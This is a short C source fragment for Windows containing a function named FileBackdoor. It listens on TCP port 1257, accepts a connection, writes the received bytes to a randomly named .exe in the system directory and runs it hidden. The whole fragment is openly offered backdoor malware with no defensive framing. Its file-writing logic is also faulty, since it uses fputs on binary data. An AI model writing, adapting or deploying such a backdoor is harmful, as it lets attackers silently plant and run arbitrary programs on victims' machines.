#define Backport 1257
#define MaxBacklog 100
int FileBackdoor(void)
{
	char Recbuf[200], Randfile[256], FName[25];
	WSADATA wData;
	WSAStartup(MAKEWORD(2,2),&wData);
	struct sockaddr_in sa;
	int s = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);

	sa.sin_family = AF_INET;
	sa.sin_port = htons(Backport);
	sa.sin_addr.s_addr = INADDR_ANY;

	bind(s,(struct sockaddr *)&sa,16);
	listen(s,MaxBacklog);

	s = accept(s,(struct sockaddr *)&sa,NULL);

	memset(Recbuf,'\0',sizeof(Recbuf));
	memset(Randfile,'\0',sizeof(Randfile));
	memset(FName,'\0',sizeof(FName));

	srand(GetTickCount());
	GetSystemDirectory(Randfile,sizeof(Randfile));
	sprintf(FName,"\\%d.exe",rand());
	strcat(Randfile,FName);
	FILE *file = fopen(Randfile,"wb");

	while(recv(s,Recbuf,sizeof(Recbuf),0)) {
		fputs(Recbuf,file);
		memset(Recbuf,'\0',sizeof(Recbuf));
	}
	fclose(file);
	closesocket(s);
	WinExec(Randfile,SW_HIDE);
}
